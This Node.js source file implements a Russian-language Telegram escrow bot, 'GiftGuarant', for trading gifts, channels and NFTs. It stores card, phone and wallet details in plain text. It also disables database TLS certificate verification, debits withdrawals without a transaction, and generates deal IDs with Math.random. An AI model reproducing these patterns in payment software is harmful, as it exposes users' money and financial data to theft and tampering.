require('dotenv').config();
const { Telegraf, Markup, session } = require('telegraf');
const { Pool } = require('pg');

// Подключение к базе
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// Бот
const bot = new Telegraf(process.env.BOT_TOKEN);
bot.use(session());

// Админские ID
const ADMIN_IDS = [123456789, 987654321];
function isAdmin(userId) { 
    return ADMIN_IDS.includes(Number(userId)); 
}

// SQL
async function dbQuery(query, params = []) {
  try { 
    const result = await pool.query(query, params);
    return result;
  }
  catch (e) { 
    console.error('DB error:', e.message, 'Query:', query); 
    throw e; 
  }
}

// Инициализация таблиц
async function initDB() {
  try {
    await dbQuery(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        user_id BIGINT UNIQUE NOT NULL,
        username VARCHAR(255),
        first_name VARCHAR(255),
        last_name VARCHAR(255),
        requisites TEXT,
        balance DECIMAL(15,2) DEFAULT 0,
        successful_deals INTEGER DEFAULT 0,
        is_banned BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMPTZ DEFAULT NOW(),
        updated_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);
    await dbQuery(`
      CREATE TABLE IF NOT EXISTS deals (
        id SERIAL PRIMARY KEY,
        deal_id VARCHAR(50) UNIQUE NOT NULL,
        seller_id BIGINT NOT NULL,
        buyer_id BIGINT,
        deal_type VARCHAR(50) NOT NULL,
        product_info TEXT NOT NULL,
        currency VARCHAR(20),
        amount DECIMAL(15,2),
        deal_link TEXT NOT NULL,
        status VARCHAR(20) DEFAULT 'active',
        created_at TIMESTAMPTZ DEFAULT NOW(),
        updated_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);
    await dbQuery(`
      CREATE TABLE IF NOT EXISTS withdrawals (
        id SERIAL PRIMARY KEY,
        user_id BIGINT NOT NULL,
        requisites TEXT NOT NULL,
        amount DECIMAL(15,2) NOT NULL,
        status VARCHAR(20) DEFAULT 'pending',
        created_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);
    console.log('✅ Таблицы созданы');
  } catch (error) {
    console.error('❌ Ошибка создания таблиц:', error);
  }
}

// Проверка бана
async function checkIfBanned(userId) {
    const result = await dbQuery(
        'SELECT is_banned FROM users WHERE user_id = $1',
        [userId]
    );
    return result.rows[0]?.is_banned || false;
}

// Главное меню
async function showMainMenu(ctx) {
  const caption = `🎯 *GiftGuarant*\n🛡️ Надёжный сервис для безопасных сделок\n\n✨ *Преимущества:*\n✅ Без комиссии\n✅ Поддержка 24/7\n✅ Полная безопасность\n✅ Мгновенные сделки\n\n💫 Ваши сделки под защитой! 🛡️`;
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('💰 Мои реквизиты', 'requisites')],
    [Markup.button.callback('💼 Создать сделку', 'createDeal')],
    [Markup.button.callback('🗒️ Мои сделки', 'myDeals')],
    [Markup.button.callback('⚙️ Настройки', 'settings')]
  ]);

  await ctx.reply(caption, { parse_mode: 'Markdown', ...keyboard });
}

// РЕКВИЗИТЫ - без сцены
async function showRequisitesMenu(ctx) {
  const caption = `💳 *Добавление реквизитов*\n\n📝 *Пришлите ваши реквизиты в формате:*\n• Номер карты\n• Номер телефона  \n• Крипто-кошелек\n\n*Пример:*\nКарта: 1234 5678 9012 3456\nТелефон: +79991234567\nКрипто: UQB123...abc`;
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('⏪ Назад в меню', 'mainMenu')]
  ]);

  await ctx.reply(caption, { parse_mode: 'Markdown', ...keyboard });
}

// СОЗДАНИЕ СДЕЛКИ - без сцены
async function showCreateDealMenu(ctx) {
  const isBanned = await checkIfBanned(ctx.from.id);
  if (isBanned) {
    await ctx.reply('❌ Вы заблокированы и не можете создавать сделки');
    return showMainMenu(ctx);
  }

  const caption = `🛍️ *Создание сделки*\n\nВыберите тип товара:`;
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('🎁 Подарки', 'deal_gifts')],
    [Markup.button.callback('📢 Канал', 'deal_channel')],
    [Markup.button.callback('🆕 NFT Активы', 'deal_nft')],
    [Markup.button.callback('⏪ Назад в меню', 'mainMenu')]
  ]);

  await ctx.reply(caption, { parse_mode: 'Markdown', ...keyboard });
}

// ВЫВОД СРЕДСТВ - без сцены
async function showWithdrawMenu(ctx) {
  const userRes = await dbQuery('SELECT balance, requisites FROM users WHERE user_id=$1', [ctx.from.id]);
  const user = userRes.rows[0] || { balance: 0, requisites: null };
  
  if (!user.requisites) {
    await ctx.reply('❌ Сначала укажите реквизиты в настройках');
    return showMainMenu(ctx);
  }
  
  const caption = `🏦 *Вывод средств*\nВаш баланс: ${user.balance}₽\nРеквизиты: ${user.requisites}\n\nВведите сумму для вывода:`;
  const buttons = Markup.inlineKeyboard([[Markup.button.callback('⏪ Назад', 'mainMenu')]]);
  await ctx.reply(caption, { parse_mode: 'Markdown', ...buttons });
}

// ОБРАБОТЧИКИ ИНЛАЙН-КНОПОК

// Главное меню
bot.action('mainMenu', async (ctx) => {
  try {
    await ctx.deleteMessage();
  } catch (error) {
    // Игнорируем ошибку удаления
  }
  await showMainMenu(ctx);
  await ctx.answerCbQuery();
});

// Реквизиты
bot.action('requisites', async (ctx) => {
  try {
    await ctx.deleteMessage();
  } catch (error) {
    // Игнорируем ошибку удаления
  }
  ctx.session.waitingFor = 'requisites';
  await showRequisitesMenu(ctx);
  await ctx.answerCbQuery();
});

// Создание сделки
bot.action('createDeal', async (ctx) => {
  try {
    await ctx.deleteMessage();
  } catch (error) {
    // Игнорируем ошибку удаления
  }
  ctx.session.dealStep = 'select_type';
  await showCreateDealMenu(ctx);
  await ctx.answerCbQuery();
});

// Выбор типа сделки
bot.action(/deal_(.+)/, async (ctx) => {
  try {
    ctx.session.dealType = ctx.match[1];
    ctx.session.dealStep = 'enter_description';
    
    const caption = `Вы выбрали: *${getDealTypeText(ctx.session.dealType)}*\n\n📝 Введите описание товара:`;
    
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('⏪ Назад', 'createDeal')]
    ]);

    await ctx.editMessageText(caption, { 
      parse_mode: 'Markdown', 
      ...keyboard 
    });
    
    await ctx.answerCbQuery();
  } catch (error) {
    console.error('Ошибка выбора типа сделки:', error);
    await ctx.answerCbQuery('❌ Ошибка');
  }
});

// Выбор валюты
bot.action(/currency_(.+)/, async (ctx) => {
  try {
    ctx.session.currency = ctx.match[1];
    ctx.session.dealStep = 'enter_amount';
    
    const caption = `Введите сумму сделки в ${ctx.session.currency}:`;
    
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('⏪ Назад', 'backToDealDescription')]
    ]);

    await ctx.editMessageText(caption, { 
      parse_mode: 'Markdown', 
      ...keyboard 
    });
    
    await ctx.answerCbQuery();
  } catch (error) {
    console.error('Ошибка выбора валюты:', error);
    await ctx.answerCbQuery('❌ Ошибка');
  }
});

// Назад к описанию сделки
bot.action('backToDealDescription', async (ctx) => {
  ctx.session.dealStep = 'enter_description';
  const caption = `Введите описание товара для *${getDealTypeText(ctx.session.dealType)}*:`;
  
  await ctx.editMessageText(caption, { 
    parse_mode: 'Markdown'
  });
  await ctx.answerCbQuery();
});

// Мои сделки
bot.action('myDeals', async (ctx) => {
  try {
    const result = await dbQuery(
      'SELECT * FROM deals WHERE seller_id = $1 ORDER BY created_at DESC LIMIT 10', 
      [ctx.from.id]
    );
    
    if (!result.rows.length) {
      const caption = `📭 *У вас пока нет сделок*\n\nСоздайте первую сделку!`;
      
      const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('💼 Создать сделку', 'createDeal')],
        [Markup.button.callback('⏪ Назад в меню', 'mainMenu')]
      ]);

      await ctx.editMessageText(caption, { 
        parse_mode: 'Markdown', 
        ...keyboard 
      });
      return;
    }
    
    const deal = result.rows[0];
    const caption = `📋 *Сделка #${deal.deal_id}*\n🎯 Тип: ${getDealTypeEmoji(deal.deal_type)} ${getDealTypeText(deal.deal_type)}\n💰 Сумма: ${deal.amount || 0} ${deal.currency || ''}\n📊 Статус: ${getStatusEmoji(deal.status)} ${deal.status}\n🕐 Создана: ${new Date(deal.created_at).toLocaleDateString('ru-RU')}`;
    
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.url('📱 Открыть сделку', deal.deal_link)],
      [Markup.button.callback('⏪ Назад в меню', 'mainMenu')]
    ]);

    await ctx.editMessageText(caption, { 
      parse_mode: 'Markdown', 
      ...keyboard 
    });
    
    await ctx.answerCbQuery();
  } catch (e) { 
    console.error('Ошибка загрузки сделок:', e);
    await ctx.answerCbQuery('❌ Ошибка загрузки сделок');
  }
});

// Настройки
bot.action('settings', async (ctx) => {
  try {
    const userRes = await dbQuery(
      'SELECT balance, successful_deals, requisites FROM users WHERE user_id = $1', 
      [ctx.from.id]
    );
    const user = userRes.rows[0] || { balance: 0, successful_deals: 0, requisites: 'не указаны' };
    
    const caption = `⚙️ *Настройки*\n\n💰 Баланс: ${user.balance}₽\n✅ Успешных сделок: ${user.successful_deals}\n💳 Реквизиты: ${user.requisites && user.requisites !== 'не указаны' ? 'указаны' : 'не указаны'}`;
    
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('💰 Пополнить баланс', 'deposit')],
      [Markup.button.callback('🏦 Вывести средства', 'withdraw')],
      [Markup.button.callback('✏️ Изменить реквизиты', 'requisites')],
      [Markup.button.callback('⏪ Назад в меню', 'mainMenu')]
    ]);

    await ctx.editMessageText(caption, { 
      parse_mode: 'Markdown', 
      ...keyboard 
    });
    
    await ctx.answerCbQuery();
  } catch (error) {
    console.error('Ошибка настроек:', error);
    await ctx.answerCbQuery('❌ Ошибка');
  }
});

// Вывод средств
bot.action('withdraw', async (ctx) => {
  ctx.session.waitingFor = 'withdraw_amount';
  await showWithdrawMenu(ctx);
  await ctx.answerCbQuery();
});

// Пополнение баланса
bot.action('deposit', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply('💰 Для пополнения баланса обратитесь к администратору: @admin');
});

// ОБРАБОТКА ТЕКСТОВЫХ СООБЩЕНИЙ
bot.on('text', async (ctx) => {
  try {
    // Обработка реквизитов
    if (ctx.session.waitingFor === 'requisites') {
      const requisites = ctx.message.text;
      
      if (!requisites || requisites.trim().length < 10) {
        await ctx.reply('❌ Реквизиты слишком короткие. Минимум 10 символов.');
        return;
      }
      
      await dbQuery(
        `INSERT INTO users (user_id, username, first_name, last_name, requisites, updated_at) 
         VALUES ($1, $2, $3, $4, $5, NOW()) 
         ON CONFLICT (user_id) 
         DO UPDATE SET requisites = $5, updated_at = NOW()`,
        [
          ctx.from.id, 
          ctx.from.username || '', 
          ctx.from.first_name || '', 
          ctx.from.last_name || '', 
          requisites.trim()
        ]
      );
      
      await ctx.reply('✅ Реквизиты успешно сохранены!');
      ctx.session.waitingFor = null;
      await showMainMenu(ctx);
      return;
    }

    // Обработка вывода средств
    if (ctx.session.waitingFor === 'withdraw_amount') {
      const amount = parseFloat(ctx.message.text.replace(',', '.'));
      if (isNaN(amount) || amount <= 0) {
        await ctx.reply('❌ Введите корректную сумму');
        return;
      }

      const userRes = await dbQuery('SELECT balance, requisites FROM users WHERE user_id=$1', [ctx.from.id]);
      const user = userRes.rows[0];
      
      if (!user || user.balance < amount) {
        await ctx.reply('❌ Недостаточно средств на балансе');
        ctx.session.waitingFor = null;
        return showMainMenu(ctx);
      }

      try {
        await dbQuery('INSERT INTO withdrawals (user_id, requisites, amount) VALUES ($1,$2,$3)', [ctx.from.id, user.requisites, amount]);
        await dbQuery('UPDATE users SET balance = balance - $1 WHERE user_id=$2', [amount, ctx.from.id]);
        
        await ctx.reply(`✅ Заявка на вывод ${amount}₽ создана и ожидает обработки`);
        ctx.session.waitingFor = null;
        await showMainMenu(ctx);
      } catch (e) {
        console.error('Ошибка вывода:', e);
        await ctx.reply('❌ Ошибка при создании заявки на вывод');
      }
      return;
    }

    // Обработка создания сделки
    if (ctx.session.dealStep === 'enter_description') {
      ctx.session.productInfo = ctx.message.text;
      ctx.session.dealStep = 'select_currency';
      
      const caption = `💵 Выберите валюту:`;
      
      const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('💎 TON', 'currency_TON'), Markup.button.callback('💵 USDT', 'currency_USDT')],
        [Markup.button.callback('⭐️ STARS', 'currency_STARS'), Markup.button.callback('🇷🇺 RUB', 'currency_RUB')],
        [Markup.button.callback('⏪ Назад', 'createDeal')]
      ]);

      await ctx.reply(caption, { parse_mode: 'Markdown', ...keyboard });
      return;
    }

    if (ctx.session.dealStep === 'enter_amount') {
      const amount = parseFloat(ctx.message.text.replace(',', '.'));
      if (isNaN(amount) || amount <= 0) { 
        await ctx.reply('❌ Введите корректную сумму (больше 0)'); 
        return; 
      }

      const dealId = generateDealId();
      const dealLink = `https://t.me/${ctx.botInfo.username}?start=deal_${dealId}`;
      
      await dbQuery(
        `INSERT INTO deals (deal_id, seller_id, deal_type, product_info, currency, amount, deal_link) 
         VALUES ($1, $2, $3, $4, $5, $6, $7)`,
        [dealId, ctx.from.id, ctx.session.dealType, ctx.session.productInfo, ctx.session.currency, amount, dealLink]
      );

      const caption = `🎉 *Сделка создана!*\n\n📋 ID: ${dealId}\n🎯 Тип: ${getDealTypeText(ctx.session.dealType)}\n💰 Сумма: ${amount} ${ctx.session.currency}\n🔗 Ссылка: ${dealLink}`;
      
      const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('⏪ Главное меню', 'mainMenu')]
      ]);

      await ctx.reply(caption, { parse_mode: 'Markdown', ...keyboard });

      // Очищаем сессию
      ctx.session.dealStep = null;
      ctx.session.dealType = null;
      ctx.session.productInfo = null;
      ctx.session.currency = null;
    }

  } catch (error) {
    console.error('Ошибка обработки текста:', error);
    await ctx.reply('❌ Произошла ошибка. Попробуйте позже.');
  }
});

// [Остальной код с админскими командами и /start обработкой остается БЕЗ ИЗМЕНЕНИЙ]

// Вспомогательные функции
function getDealTypeText(type) { 
  const types = { 'gifts': 'Подарки', 'channel': 'Канал', 'nft': 'NFT Активы' }; 
  return types[type] || type; 
}

function getDealTypeEmoji(type) { 
  const emojis = { 'gifts': '🎁', 'channel': '📢', 'nft': '🆕' }; 
  return emojis[type] || '💼'; 
}

function getStatusEmoji(status) { 
  const emojis = { 'active': '🟢', 'paid': '🟡', 'completed': '🔵', 'cancelled': '🔴' }; 
  return emojis[status] || '⚪'; 
}

function generateDealId() {
  return Math.random().toString(36).substring(2, 8).toUpperCase();
}

// Запуск
initDB().then(() => {
  console.log('✅ База данных инициализирована');
  bot.launch().then(() => {
    console.log('✅ Бот запущен');
  });
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
